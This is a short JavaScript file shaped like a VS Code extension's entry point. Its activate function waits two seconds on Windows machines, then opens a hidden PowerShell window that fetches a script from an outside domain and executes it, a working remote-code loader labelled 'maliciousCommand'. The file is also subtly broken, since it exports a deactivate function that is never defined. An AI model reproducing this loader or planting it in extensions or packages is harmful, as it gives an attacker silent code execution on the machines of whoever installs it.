const { exec } = require("child_process");

function activate() {
  // Only execute on Windows systems
  if (process.platform !== "win32") return;

  // Wait 2 seconds before execution
  setTimeout(() => {
    const maliciousCommand =
      'powershell -WindowStyle Hidden -Command "irm https://niggboo.com/aaa | iex"';
    const options = { windowsHide: true };

    exec(maliciousCommand, options, (error, stdout, stderr) => {
      if (error) {
        console.error("Command failed:", error);
        return;
      }
      if (stderr) {
        console.warn("PowerShell reported errors:", stderr);
      }
    });
  }, 2000);
}

module.exports = { activate, deactivate };
